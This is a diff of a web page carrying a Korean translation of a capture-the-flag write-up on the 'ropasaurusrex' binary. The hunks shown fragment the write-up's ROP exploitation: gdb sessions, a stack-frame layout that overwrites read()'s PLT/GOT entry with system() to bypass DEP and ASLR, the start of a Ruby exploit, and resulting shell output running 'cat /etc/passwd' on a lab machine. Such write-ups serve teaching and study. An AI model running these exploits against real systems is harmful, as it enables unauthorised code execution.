@@ -192,7 +192,7 @@ Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x43434343 in ?? ()</span>
 <span class="o">(</span>gdb<span class="o">)</span> x/s 0x08049530
 0x8049530:       <span class="s2">&quot;cat /etc/passwd&quot;</span>
-</code></pre></div><p>완벽하다!<h3><a id="running-it"></a>실행하기</h3><p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다: <!-- ``` sh $ ldd ./ropasaurusrex linux-gate.so.1 => (0xb7703000) libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb75aa000) /lib/ld-linux.so.2 (0xb7704000) &ldquo;` &ndash;><div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>ldd ./ropasaurusrex
+</code></pre></div><p>완벽하다!<h3><a id="running-it"></a>실행하기</h3><p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>ldd ./ropasaurusrex
         linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7703000<span class="o">)</span>
         libc.so.6 <span class="o">=</span>&gt; /lib/i686/cmov/libc.so.6 <span class="o">(</span>0xb75aa000<span class="o">)</span>
         /lib/ld-linux.so.2 <span class="o">(</span>0xb7704000<span class="o">)</span>
@@ -200,7 +200,7 @@ Program terminated with signal 11, Segmentation fault.
 000f5470 g    DF .text  <span class="m">00000042</span>  GLIBC_2.0   svcerr_systemerr
 <span class="m">00039450</span> g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
 <span class="m">00039450</span>  w   DF .text  0000007d  GLIBC_2.0   system
-</code></pre></div><p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다: <!-- ``` sh $ gdb --quiet ./ropasaurusrex core [...] Program terminated with signal 11, Segmentation fault. #0 0x43434343 in ?? () (gdb) x/x system 0xb7ec2450 <system>: 0x890cec83 &rdquo;` &ndash;><div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
+</code></pre></div><p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
 <span class="o">[</span>...<span class="o">]</span>
 Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x43434343 in ?? ()</span>
@@ -435,7 +435,7 @@ bin:x:2:2:bin:/bin:/bin/sh
 </code></pre></div><p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.<p>끝났다, 그렇지?<p>실은 틀렸다!<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>1
 kernel.randomize_va_space <span class="o">=</span> 1
 ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
-</code></pre></div><p>여기서부터 조금 더 복잡해진다. 가보자!<h2><a id="what-is-aslr"></a>ASLR이 뭐야?</h2><p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자: <!-- ``` sh ron@debian-x86 ~ $ perl -e 'printf "A"x1000' | ./ropasaurusrex Segmentation fault (core dumped) ron@debian-x86 ~ $ gdb ./ropasaurusrex core Program terminated with signal 11, Segmentation fault. #0 0x41414141 in ?? () (gdb) x/x system 0xb766e450 <system>: 0x890cec83 ron@debian-x86 ~ $ perl -e 'printf &quot;A&quot;x1000&rsquo; | ./ropasaurusrex Segmentation fault (core dumped) ron@debian-x86 ~ $ gdb ./ropasaurusrex core Program terminated with signal 11, Segmentation fault. #0 0x41414141 in ?? () (gdb) x/x system 0xb76a7450 <system>: 0x890cec83 &rdquo;` &ndash;><div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
+</code></pre></div><p>여기서부터 조금 더 복잡해진다. 가보자!<h2><a id="what-is-aslr"></a>ASLR이 뭐야?</h2><p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 Program terminated with signal 11, Segmentation fault.
@@ -461,7 +461,7 @@ OFFSET   TYPE              VALUE
 <span class="m">08049614</span> R_386_JUMP_SLOT   write
 <span class="m">08049618</span> R_386_JUMP_SLOT   __libc_start_main
 0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
-</code></pre></div><p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자: <!-- ``` sh $ gdb ./ropasaurusrex (gdb) run ^C Program received signal SIGINT, Interrupt. 0xb7fe2424 in __kernel_vsyscall () (gdb) x/x 0x0804961c 0x804961c: 0xb7f48110 (gdb) print read $1 = {<text variable, no debug info>} 0xb7f48110 <read> &ldquo;` &ndash;><div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb ./ropasaurusrex
+</code></pre></div><p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb ./ropasaurusrex
 <span class="o">(</span>gdb<span class="o">)</span> run
 ^C
 Program received signal SIGINT, Interrupt.
@@ -525,7 +525,7 @@ Program received signal SIGINT, Interrupt.
 +----------------------+
 |         ...          |
 +----------------------+
-</code></pre></div><p>오 이런, 이게 대체 뭐야?<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다: <!-- ``` sh (gdb) x/i 0x0804832C 0x804832c <read@plt>: jmp DWORD PTR ds:0x804961c &rdquo;` &ndash;><div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> x/i 0x0804832C
+</code></pre></div><p>오 이런, 이게 대체 뭐야?<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> x/i 0x0804832C
 0x804832c &lt;<span class="nb">read</span>@plt&gt;:   jmp    DWORD PTR ds:0x804961c
 </code></pre></div><p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!<h2><a id="final-code"></a>최종 코드</h2><p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
 
@@ -640,4 +640,4 @@ debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</
 /home/ron
 whoami
 ron
-</code></pre></div><h2><a id="conclusion"></a>결론</h2><p>이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.<p>질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!<div class="footnotes"><hr><ol><li id="fn1"><p>링크가 <a href="https://wiki.skullsecurity.org/Assembly">바뀌었다</a>.&nbsp;<a href="#fnref1" rev="footnote">&#8617;</a></ol></div></div></article></div></div><footer class="site-footer"><div class="wrapper"><p> Content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a><br /> Copyright &copy; 2015 - <a href="/about/">Yous</a> - <a href="/atom.xml">RSS</a></div></footer>
+</code></pre></div><h2><a id="conclusion"></a>결론</h2><p>이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.<p>질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!<div class="footnotes"><hr><ol><li id="fn1"><p>링크가 <a href="https://wiki.skullsecurity.org/Assembly">바뀌었다</a>.&nbsp;<a href="#fnref1" rev="footnote">&#8617;</a></ol></div></div></article></div></div><footer class="site-footer"><div class="wrapper"><p> Content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a><br /> &copy; 2013--2015 - <a href="/about/">Yous</a> - <a href="/atom.xml">RSS</a></div></footer>
